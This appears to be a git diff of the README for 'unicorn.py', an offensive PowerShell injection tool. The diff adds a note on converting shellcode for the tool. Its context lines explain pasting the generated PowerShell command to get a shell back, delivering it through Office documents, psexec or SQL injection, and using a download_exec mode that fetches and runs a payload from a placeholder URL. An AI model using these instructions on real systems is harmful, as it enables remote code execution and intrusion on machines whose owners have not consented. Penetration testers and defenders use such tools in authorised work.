@@ -80,6 +80,7 @@ Custom Shellcode: python unicorn.py <path_to_shellcode.txt> shellcode (formatted
 Help Menu: python unicorn.py --help
 ```
 
+
 ###                -----POWERSHELL ATTACK INSTRUCTIONS----
 
 Everything is now generated in two files, powershell_attack.txt and unicorn.rc. The text file contains  all of the code needed in order to inject the powershell attack into memory. Note you will need a place that supports remote command injection of some sort. Often times this could be through an excel/word  doc or through psexec_commands inside of Metasploit, SQLi, etc.. There are so many implications and  scenarios to where you can use this attack at. Simply paste the powershell_attack.txt command in any command prompt window or where you have the ability to call the powershell executable and it will give a shell back to you. This attack also supports windows/download_exec for a payload method instead of just Meterpreter payloads. When using the download and exec, simply put python unicorn.py windows/download_exec url=https://www.thisisnotarealsite.com/payload.exe and the powershell code will download the payload and execute.
@@ -238,6 +239,12 @@ following format or it will not work:
 
 Also note that there is size restrictions. The total length size of the PowerShell command cannot exceed
 the size of 8191. This is the max command line argument size limit in Windows.
+
+For convert shellcode to formatted shellcode that unicorn accept
+
+```
+python3 custom_shellcode_converter.py <path_to_shellcode> > formatted_shellcode.txt
+```
 
 Usage:
 
